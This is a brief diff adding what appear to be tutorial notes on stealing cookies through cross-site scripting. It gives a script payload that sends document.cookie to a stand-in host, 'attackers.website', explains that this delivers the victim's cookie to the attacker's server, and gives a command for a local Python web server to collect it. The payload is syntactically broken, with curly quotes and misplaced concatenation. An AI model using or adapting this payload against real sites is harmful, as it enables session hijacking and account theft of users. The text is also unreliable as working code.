@@ -1,0 +1,9 @@
+<script>document.location.href=”attackers.website/cookie=”>+document.cookie</script>
+
+*Where document.cookie will give the victims cookie and document.location.href will send the data to attacker’s web server
+
+*Command for local Python web Server:
+
+python -m SimpleHTTPServer port 
+
+Web Server will be <ip>:<port>
